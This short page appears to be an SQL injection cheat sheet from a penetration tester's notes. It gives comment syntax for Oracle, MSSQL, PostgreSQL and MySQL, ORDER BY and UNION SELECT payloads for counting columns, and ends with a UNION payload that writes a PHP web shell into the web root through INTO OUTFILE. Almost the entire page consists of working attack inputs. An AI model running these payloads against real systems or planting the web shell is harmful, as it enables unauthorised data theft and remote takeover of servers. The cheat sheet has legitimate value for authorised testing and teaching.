---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# SQL injection

## Comments

```bash
# Oracle
--comment

# MSSQL
--comment
/*comment*/

# PostgreSQL
--comment
/*comment*/

# MySQL
#comment
-- comment    # include the space
/*comment*/
```

## Detecting columns

```bash
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
# and so on. Until an error occured
```

### Union select

```bash
# keep replacing 'a'. Until an error occured
' UNION SELECT 'a',NULL,NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL,NULL--
```

### Union all select

```bash
' UNION ALL SELECT 1-- - 
' UNION ALL SELECT 1,2-- -
' UNION ALL SELECT 1,2,3-- -
# keep going until one of the number in the output
```

## Backdoor/web shell

```php
# PHP web shell
' UNION ALL SELECT '<?php system($_REQUEST["cmd"]);?>' INTO OUTFILE '/var/www/html/cmd.php'-- -
```
